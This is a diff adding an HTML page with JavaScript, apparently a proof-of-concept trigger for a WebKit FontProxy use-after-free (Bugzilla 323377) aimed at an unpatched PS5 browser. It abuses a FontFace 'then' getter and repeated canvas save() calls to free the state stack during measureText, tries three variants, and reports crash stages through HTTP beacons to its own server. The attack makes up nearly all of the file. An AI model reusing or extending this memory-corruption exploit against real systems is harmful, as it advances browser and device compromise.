@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V933</title></head>
+<body><pre id="out">V933 - CanvasRenderingContext2DBase::FontProxy UAF (WebKit 673f4df5, Bugzilla 323377): measureText holds raw FontProxy* while save() x18 reallocs the state stack mid-font-load</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V933-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v933 - first probe on the FontProxy UAF. Source-verified 2026-11-12:
+ *   commit 673f4df5 "Make CanvasRenderingContext2DBase::FontProxy ref-counted"
+ *   (tuankiet65, Bugzilla 323377, rdar 185865732, canonical 325725@main,
+ *   originally-landed 316606.666@safari-7625-branch).
+ *
+ * THE BUG: CanvasRenderingContext2DBase::fontProxy() returns state().font.ptr()
+ * - a raw pointer. measureTextInternal holds it across FontProxy::
+ * metricsOfPrimaryFont(), which triggers font loading; resolving the FontFace's
+ * loaded promise runs a Get(face,"then") -> our getter -> save() x18 forces
+ * state-stack REALLOC -> the old buffer (holding the FontProxy BY VALUE) is
+ * freed -> after the getter returns, metricsOfPrimaryFont() keeps running on
+ * the freed FontProxy. C++-layer UAF: no JIT dependency, no JS-heap object,
+ * and the freed buffer is a state-stack realloc free (NOT a GC free) so the
+ * zero-at-free law measured on the FontFace channel (v930/v931) does not
+ * automatically apply here.
+ *
+ * FIX IS Nov 2026 - far past the 26.3-in / 26.4-out cherry-pick cutoff
+ * (p659-p671). PS5 14.22 WebKit should be PRE-FIX.
+ *
+ * TRIGGER PRECONDITION: the getter only fires if the face load FULFILLS
+ * synchronously inside measureText (resolve(face) thenable-check). A local()
+ * src that matches no font REJECTS -> no thenable check -> no reentry. So we
+ * try three variants, each self-contained, beacons at every stage:
+ *   A: verbatim WebKit test - local(Helvetica), save+lineWidth first
+ *      (state stack heap-backed), 18 saves in getter.
+ *   B: local(Arial) - PS5 more likely to have Arial; same shape.
+ *   C: null-deref variant - NO initial save (state stack still inline),
+ *      local(Arial) - the realloc moves the buffer the FontProxy points into.
+ * If a variant crashes the WebProcess the later beacons never arrive; the
+ * beacon ORDER in server.log is the diagnosis:
+ *   ...A-E,F,G,H -> survived (patched, or freed-but-coherent memory)
+ *   ...A-E,F,G   (no H) -> died inside measureText AFTER reentry = UAF hit
+ *   ...A-E       (no F) -> load did not fulfill synchronously; trigger shape
+ *                           did not engage (not a negative on the bug itself)
+ *
+ * READOUT beacon payload: font readback + a second measureText() after the
+ * first returns - repeated use of the stale proxy is where freed-but-mapped
+ * memory shows up as garbage metrics instead of a clean crash.
+ * One load. Single-shot, single-page per WebProcess-restart law.
+ */
+
+function makeFace(fam,src){
+  try{ return new FontFace(fam,src); }catch(e){ bk('FACE-ERR',fam+' '+e); return null; }
+}
+
+function runVariant(tag, fam, src, heapFirst){
+  var face=makeFace(fam,src);
+  if(!face) return;
+  bk(tag+'-A','face created '+fam);
+  try{ face.loaded; }catch(e){ bk(tag+'-loaded-err',String(e)); }
+
+  var ctx=null;
+  try{ ctx=document.createElement('canvas').getContext('2d'); }catch(e){ bk(tag+'-ctx-err',String(e)); return; }
+  bk(tag+'-B','ctx ok');
+
+  try{
+    if(heapFirst){ ctx.save(); ctx.lineWidth=0.5; }   /* heap-back the state stack (verbatim) */
+    ctx.font='10px '+fam;
+  }catch(e){ bk(tag+'-font-err',String(e)); return; }
+  bk(tag+'-C','font set');
+
+  var getterFired=0;
+  try{
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(getterFired) return undefined;
+        getterFired=1;
+        bk(tag+'-F','GETTER FIRED inside measureText; running 18 saves');
+        for(var i=0;i<18;i++){ try{ ctx.save(); ctx.lineWidth=1+i; }catch(e){ bk(tag+'-save-err',i+' '+String(e)); break; } }
+        bk(tag+'-G','getter done, returning undefined');
+        return undefined;
+      }
+    });
+  }catch(e){ bk(tag+'-def-err',String(e)); return; }
+  bk(tag+'-D','getter installed');
+
+  var w=null;
+  try{ w=ctx.measureText('a'); }catch(e){ bk(tag+'-E-throw',String(e)); }
+  bk(tag+'-E','measureText returned '+(w?('(w='+w.width+')'):'null')+' getterFired='+getterFired);
+
+  if(getterFired){
+    /* stale-proxy continued use: repeated reads through the same raw pointer */
+    try{ var w2=ctx.measureText('bb'); bk(tag+'-H','2nd measureText OK w='+w2.width); }
+    catch(e){ bk(tag+'-H-throw',String(e)); }
+    try{ bk(tag+'-I','font readback = '+ctx.font); }catch(e){ bk(tag+'-I-throw',String(e)); }
+  }
+
+  try{ delete FontFace.prototype.then; }catch(e){}
+  bk(tag+'-J','variant done, getter removed');
+}
+
+/* A: verbatim - Helvetica, heap-first */
+runVariant('A','MyTestFam','local(Helvetica)',true);
+/* B: Arial, heap-first */
+runVariant('B','MyTestFam2','local(Arial)',true);
+/* C: null-deref shape - Arial, inline stack (no initial save) */
+runVariant('C','MyTestFam3','local(Arial)',false);
+
+bk('DONE','all variants returned without crash');
+</script></body></html>
